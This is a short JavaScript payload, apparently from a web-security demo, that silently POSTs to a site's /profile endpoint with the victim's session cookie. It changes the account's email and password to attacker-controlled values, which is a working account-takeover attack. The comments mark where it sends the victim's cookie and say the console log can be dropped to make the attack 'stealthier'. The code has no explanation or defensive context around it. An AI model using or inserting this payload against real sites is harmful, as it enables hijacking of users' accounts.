(function () {
  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",                       // send the victim's session cookie
    body: "email=attacker@evil.example&password=pwned-by-attacker"
  })
  .then(function () {
    // Visible proof during the demo; remove for a stealthier attack.
    console.log("[payload] victim profile overwritten");
  });
})();
